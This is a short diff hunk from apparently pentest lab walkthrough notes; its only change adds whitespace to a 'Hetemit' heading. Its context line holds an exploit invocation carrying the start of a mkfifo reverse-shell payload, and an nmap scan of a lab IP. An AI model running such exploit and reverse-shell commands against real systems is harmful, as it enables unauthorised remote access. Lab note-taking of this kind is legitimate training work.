@@ -266,7 +266,7 @@ python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/
 
 
 ```
-### Hetemit
+### Hetemit 
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
